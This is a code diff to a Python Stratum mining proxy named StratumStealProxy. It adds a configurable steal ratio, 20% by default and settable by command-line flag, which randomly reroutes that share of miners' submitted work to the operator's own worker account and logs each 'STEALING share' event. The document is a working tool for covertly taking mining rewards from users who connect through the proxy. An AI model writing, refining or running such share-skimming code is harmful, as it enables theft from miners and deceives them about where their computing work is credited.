@@ -25,6 +25,7 @@ class StratumStealProxy:
         upstream_port: int = 3333,
         upstream_user: str = "proxy_worker",
         upstream_password: str = "x",
+        steal_ratio: float = 0.2,
     ):
         self.listen_host = listen_host
         self.listen_port = listen_port
@@ -32,15 +33,14 @@ class StratumStealProxy:
         self.upstream_port = upstream_port
         self.upstream_user = upstream_user
         self.upstream_password = upstream_password
+        self.steal_ratio = steal_ratio
 
         self.server: asyncio.Server | None = None
         self.running = False
 
-        self._miner_submit_id = 1
         self._upstream_submit_id = 1
         self._id_to_upstream: dict[int, int] = {}
         self._upstream_to_miner: dict[int, int] = {}
-        self._miner_authorized = False
         self._upstream_authorized = False
         self._upstream_auth_id = None
 
@@ -87,6 +87,7 @@ class StratumStealProxy:
             async def forward_miner_to_pool():
                 try:
                     buffer = b""
+                    share_counter = 0
                     while self.running:
                         data = await asyncio.wait_for(client_reader.read(4096), timeout=30)
                         if not data:
@@ -110,29 +111,35 @@ class StratumStealProxy:
                             msg_id = message.get("id")
 
                             if method == "mining.authorize":
-                                self._miner_authorized = True
                                 self._log(
                                     "MINER", f"Authorize request: {message.get('params', [])}"
                                 )
 
                             elif method == "mining.submit":
+                                share_counter += 1
                                 original_worker = message.get("params", [""])[0]
                                 original_id = message.get("id")
 
-                                new_id = self._upstream_submit_id
-                                self._upstream_submit_id += 1
-                                self._id_to_upstream[original_id] = new_id
-                                self._upstream_to_miner[new_id] = original_id
+                                if random.random() < self.steal_ratio:
+                                    new_id = self._upstream_submit_id
+                                    self._upstream_submit_id += 1
+                                    self._id_to_upstream[original_id] = new_id
+                                    self._upstream_to_miner[new_id] = original_id
 
-                                message["params"][0] = self.upstream_user
-                                message["id"] = new_id
+                                    message["params"][0] = self.upstream_user
+                                    message["id"] = new_id
 
-                                self._log(
-                                    "MINER",
-                                    f"Submit from worker '{original_worker}' -> changing to '{self.upstream_user}'",
-                                )
+                                    self._log(
+                                        "MINER",
+                                        f"STEALING share #{share_counter}: '{original_worker}' -> '{self.upstream_user}'",
+                                    )
 
-                                line = (json.dumps(message) + "\n").encode("utf-8")
+                                    line = (json.dumps(message) + "\n").encode("utf-8")
+                                else:
+                                    self._log(
+                                        "MINER",
+                                        f"Forwarding share #{share_counter} (NOT stealing)",
+                                    )
 
                             upstream_writer.write(line + b"\n")
                             await upstream_writer.drain()
@@ -228,6 +235,7 @@ class StratumStealProxy:
         print(f"[PROXY] Listening on {addr[0]}:{addr[1]}")
         print(f"[PROXY] Forwarding to {self.upstream_host}:{self.upstream_port}")
         print(f"[PROXY] Upstream credentials: {self.upstream_user}:{self.upstream_password}")
+        print(f"[PROXY] Steal ratio: {self.steal_ratio * 100:.0f}%")
 
         async with self.server:
             await self.server.serve_forever()
@@ -264,6 +272,12 @@ async def main():
         default="x",
         help="Upstream worker password (default: x)",
     )
+    parser.add_argument(
+        "--steal-ratio",
+        type=float,
+        default=0.2,
+        help="Ratio of shares to steal (default: 0.2 = 20%%)",
+    )
 
     args = parser.parse_args()
 
@@ -280,6 +294,7 @@ async def main():
         upstream_port=upstream_port,
         upstream_user=args.upstream_user,
         upstream_password=args.upstream_password,
+        steal_ratio=args.steal_ratio,
     )
 
     loop = asyncio.get_running_loop()
